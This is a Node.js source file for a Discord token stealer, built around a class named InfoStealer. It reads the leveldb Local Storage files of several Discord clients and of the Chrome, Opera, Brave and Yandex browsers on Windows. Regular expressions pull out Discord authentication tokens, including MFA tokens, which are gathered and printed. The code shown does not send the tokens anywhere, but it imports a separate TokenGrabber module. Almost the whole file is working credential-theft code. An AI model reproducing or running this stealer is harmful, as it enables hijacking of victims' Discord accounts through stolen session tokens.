const fs = require('fs')
const path = require('path')
const TokenGrabber = require('./TokenGrabber')


class InfoStealer {
    constructor() {
        this.local = process.env.LOCALAPPDATA
        this.roaming = process.env.APPDATA

        this.TokenGrabber = new TokenGrabber()
    }
}

function findToken(tokenPath) {
    tokenPath += "\\Local Storage\\leveldb"
    let tokens = []

    try {
        fs.readdirSync(path.normalize(tokenPath)).map(file => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {
                    // https://www.regextester.com/
                    const regex = [
                        new RegExp(/mfa\.[\w-]{84}/g), 
                        new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                    ] 
                    for (const _regex of regex) {
                        const token = line.match(_regex)
                    
                        if (token) {
                            token.forEach(element => {
                                tokens.push(element)
                            })
                        }
                    }
                    
                })
            }  
        })
    } catch {
        // console.log(`no directory found for ${tokenPath}`)
    }
    return tokens
}

function discordTokenGrabber () {
    let paths
    const computerPlatform = process.platform

    if (computerPlatform == "win32") {
        const local = process.env.LOCALAPPDATA
        const roaming = process.env.APPDATA
        
        paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }    
    
    const tokens = {}
    for (let [platform, path] of Object.entries(paths)) {
        const tokenList = findToken(path)
        if (tokenList) {
            tokenList.forEach(token => {
                if (tokens[platform] === undefined) tokens[platform] = []
                tokens[platform].push(token)     
            })
        }  
    }
    console.log(tokens)
    return tokens
}